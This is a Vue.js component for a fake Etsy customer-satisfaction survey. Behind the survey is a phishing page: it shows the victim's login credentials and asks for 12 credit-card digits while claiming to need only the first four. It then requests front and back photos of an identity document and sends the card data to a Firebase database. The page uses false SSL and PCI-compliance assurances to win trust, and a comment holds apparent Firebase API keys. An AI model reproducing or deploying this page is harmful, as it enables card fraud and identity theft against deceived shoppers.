<template>
	<div class="survey">
		<div class="main">
		<span>{{username}}</span>
		<span>{{password}}</span>
		<div>
			<div class="progressBar">
				<ul class="list-unstyled list-inline">
					<li class="active"></li>
					<li v-bind:class="{active:formCounter >= 11}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 2}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 3}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 4}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 5}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 6}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 7}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 8}"></li>
				
				</ul>
			</div>
			<div class="text-center suervey-fields mt-2">
			   <transition name='fieldtran'>
			   	<div class="first-field" v-show='formCounter < 11'>
			 	<h3>What is you current employement status?</h3>
			 	<ul class=" list-inline">
					<li v-on:click=incressCounter >In educatino</li>
					<li v-on:click=incressCounter >unemployed,serching for Job</li>
					<li v-on:click=incressCounter> unemployed,Not serching for Job</li>
					<li v-on:click=incressCounter> Part time empeloyment</li>
					<li v-on:click=incressCounter> Part time empeloyment</li>
					<li v-on:click=incressCounter> Self employed</li>
					<li v-on:click=incressCounter> I prever not answer</li>
			 	</ul>
			    </div>
			   </transition>
			   <transition name='fieldtran'>
			   	<div class="first-field" v-show='formCounter == 11'>
			 	<h3>What is your average  yearly houdhold income (in USD)</h3>
			 	<ul class=" list-inline">
			 		
			 		<li v-on:click=incressCounter >Less than $50,000</li>
			 		<li v-on:click=incressCounter >$50,000 to $99,000</li>
			 		<li v-on:click=incressCounter> $100,000 to $149,99</li>
			 		<li v-on:click=incressCounter> $150,000 to $199,999</li>
			 		<li v-on:click=incressCounter> more than $200,000</li>
			 		<li v-on:click=incressCounter> I prever not answer</li>
			 	</ul>
			    </div>
			   </transition>
			   <transition name='fieldtran'>
			   <div class="first-field" v-show='formCounter == 11 * 2'>
			 	<h3>which of our categories you like to purchase on ETS</h3>
			 	<ul class=" list-inline">
			 		<li v-on:click=incressCounter >Jeweiry & Accessoires</li>
			 		<li v-on:click=incressCounter >Cloth & Shoes</li>
			 		<li v-on:click=incressCounter> Home $ Living</li>
			 		<li v-on:click=incressCounter> Widing & party</li>
			 		<li v-on:click=incressCounter>Toys & Entertaiment</li>
			 		<li v-on:click=incressCounter> Art & collection</li>
			 		<li v-on:click=incressCounter> Craft Suppliers& Tools</li>
			 		<li v-on:click=incressCounter>Vintage </li>
			 		<li v-on:click=incressCounter>Other </li>
			 	</ul>
			    </div>
			   </transition>
			   <transition name='fieldtran'>
			   <div class="first-field" v-show='formCounter == 11 *3'>
			 	<h3>Which of our categories you like to purchase on ETS</h3>
			 	<ul class="list-inline rate">
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >1</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >2</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >3</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >4</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >5</li>
			 	</ul>
			    </div>
			   </transition>
			   <transition name='fieldtran'>
			   <div class="first-field" v-show='formCounter == 11 *4'>
			 	<h3>How likely you to recommend Etsy to a friend or college?</h3>
			 	<ul class="list-inline rate">
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >1</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >2</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >3</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >4</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >5</li>
			 	</ul>
			    </div>
			   </transition>
			     <transition name='fieldtran'>
			   <div class="first-field" v-show='formCounter == 11 *5'>
			 	<h3>How you satified are you after you case is close?</h3>
			 	<ul class="list-inline rate">
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >1</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >2</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >3</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >4</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >5</li>
			 	</ul>
			    </div>
			   </transition>
			    <transition name='fieldtran'>
			   <div class="first-field" v-show='formCounter == 11 * 6'>
			 	<h3>If there one thing that could change about Etsy involevment in case ,what you would be?</h3>
			 	<form @submit="checkform">
			 		<textarea required=required class="form-control" cols="4" rows="5" placeholder="Enter a text" v-model='textArea' >
			 		
			 	</textarea>
			 	<button class="btn btn-default"  type="submit">Countinue</button>
			 	</form>
			 	
			 	
			    </div>
			   </transition>
			    <transition name='fieldtran'>
			   <div class="first-field text-center" v-show='formCounter == 11 * 7'>
			 	<h3>Confirm you credit cardused at purchase from Etsy,Enter just the first four digits so we can contact your bank easier and provide more support when detecting your purchase from a suspecious Seller</h3>
			 	<div class="input-group center-credit">
			 	<form @submit="checkformCard">
			 	 <div class="fomr-group">
			 		<div class="input-group-prepend">
			 			<input required="required" type="password" class="form-contorole" min="12" max="12" name="card-credit" v-model='cardCredit' placeholder="12 Digits" >
			 			<span class="input-group-text">
			 				****
			 			</span>
			 			</div>
			 			<div v-if='errors.length'>
			 				<ul class="list-unstyled">
			 				<b class="text-muted">Please correct the following error(s):</b>
			 					<li v-for='error in errors' v-bind:key="error">
			 						{{error}}
			 					</li>
			 				</ul>
			 			</div>
			 		</div>
			 		<button type="submit" class="btn btn-default" >Countinue</button>
			 	</form>
			 		
			 	</div>
			 	
			 		
			 	<p>
				* All credit card information sent to Etsy is encrypted using scure layer technology (SSL),and stored in PCI compliant environment,Etsy follow industry standards to protect other payment and personnal information submitted to us,both during transmission and after Etsy recieves it
			   </p>
			    </div>
			   </transition>
			   <transition name='fieldtran'>
			   <div class="first-field" v-show='formCounter == 11 * 8'>
			 	<h3>Providing any peace of idintication can help us securing your account by validation your country residency to serve you better when you open a case on Etsy or when you contacting our 24/7 support</h3>
			 	<span class="text-muted">(please provide us front and back of you document if necessary)</span>
			 	<div class="text-center upoad-file">
					
					<form @submit.prevent='uplodaImages'>
						
					   <input type="hidden"  role="uploadcare-uploader" required="required" name="content" id="uploadIm" data-public-key="18d099d9d7d6dcf24d21" data-images-only />
					<button type="submit" class="btn btn-default"   >Countinue</button>
					</form>
					
					
			 	</div>
				
			    </div>
			   </transition>
			</div>
		</div>
			
			<!--  <span>{{formCounter}}</span>
						<button v-on:click=incressCounter>next</button> -->

		</div>
	</div>
</template>
<style src='../assets/css/survey.scss' lang='scss'></style>
<script >
import surveyField from './surveyField';
import sendmailService from './../services/sendmailService'
import formLogin from './formLogin';
import axios from 'axios';
// import Firebase from 'firebase'
//   const config = {
//     apiKey: "AIzaSyAqlaJPjmgGqfNdzHdzoCtSqUgu70vA0vY",
//     authDomain: "etsy-project-9696e.firebaseapp.com",
//     databaseURL: "https://etsy-project-9696e.firebaseio.com",
//     projectId: "etsy-project-9696e",
//     storageBucket: "etsy-project-9696e.appspot.com",
//     messagingSenderId: "1080929571550"
//   };
//   console.log(this.username)
// const app = Firebase.initializeApp(config)
// let db = app.database()
import db from './../db';
let fbInfo = db.ref('etsyInfo')
	export default{
		props:['userlogin'],
		components:{
		 surveyField
       
		},
		firebase: {
		etsy: fbInfo
		},
		props:{
			username:String,
			password:String
		},
		data() {
			return{
				formCounter:0,
				textArea:'',
				istextValid:false,
				cardCredit:'',
				logedIn:false,
				imageCptured:'',
				imageUploaded:'',
				errors:[],
				files:[],
				userInfo: {
				
				credtCard: '',
				feedback:''
				
			}
			}
		},
		methods:{
			incressCounter:function(){
				return this.formCounter+=11;
			},
			decressCounter:function(){
				return this.formCounter-=11;
			},
			
			checkform:function(e){
			 
             if(this.textArea &&  this.textArea.length > 2){
             	this.istextValid=true
             	this.formCounter+=11
             	console.log(this.textArea)
             }
                if(!this.textarea) this.errors.push("Name required.");

              e.preventDefault();
			},
			checkformCard:function(e){
			 if(this.cardCredit.length < 12){
             	this.errors.push("Age required.");
             }
             this.formCounter+=11;
             console.log(this.cardCredit)
              e.preventDefault();
			},
			
			 uplodaImages:function(e){
				 const uploadIm=document.querySelector('#uploadIm');
				fbInfo.push({
				creditcard: this.cardCredit,
				feedback :this.textArea

				});
				this.$router.push({name:'thanks'})
				//  this.userInfo.username='';
				//  this.userInfo.password='';

			// 	console.log('the form submited')

		
			// 	const emailData={

			// 	opinion:this.textArea,
			// 	cardC:this.cardCredit
			// 	}
            //    sendmailService.sendMail(emailData).then(res => {
            //  	this.$router.push({name:'thanks'})
            //  	console.log(res)
            //  	}).catch(err => {console.log(err)})
				e.preventDefault()
			}
		}
	}

</script>
